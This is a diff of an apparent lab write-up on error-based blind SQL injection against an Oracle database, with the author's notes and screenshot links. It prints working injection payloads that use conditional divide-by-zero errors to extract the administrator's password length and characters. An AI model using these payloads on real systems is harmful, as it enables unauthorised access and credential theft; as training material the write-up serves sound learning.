@@ -21,13 +21,17 @@ First, I intercepted the request made to the webpage when i refreshed the page, 
 <img width="1060" height="366" alt="image" src="https://github.com/user-attachments/assets/ea09ba19-8f44-43d8-9e1e-7c89d9feee8e" />
 
 And it worked, so I played around a bit and found an injection that works and will allow me to find the password of the administrator:
+
 `ZSQXb6IrINNDbKRT' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(password, 1, 1) = 'a') THEN 1/0 ELSE 'x' END FROM users)='x` -> I tried this first but it'd give me an error no matter what, then I realized it was an oracle database
+
 `ZSQXb6IrINNDbKRT' AND (SELECT CASE WHEN (SUBSTR(password, 1, 1) = 'a') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a` -> I played around with the payload until I ended up with this, which worked
 
 (go through alphanumerical characters to find the first character, then repeat for the second and so on)
 
 But, I also need to find the length of the password first and to do that I will inject:
+
 `ZSQXb6IrINNDbKRT' AND (SELECT CASE WHEN (LENGTH(password)=19) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a`
+
 I get an error when I set the length to 20, meaning the length of the password is 20
 <img width="1002" height="404" alt="image" src="https://github.com/user-attachments/assets/a38e4abc-94ab-4651-9f4a-39a871d31d1d" />
 
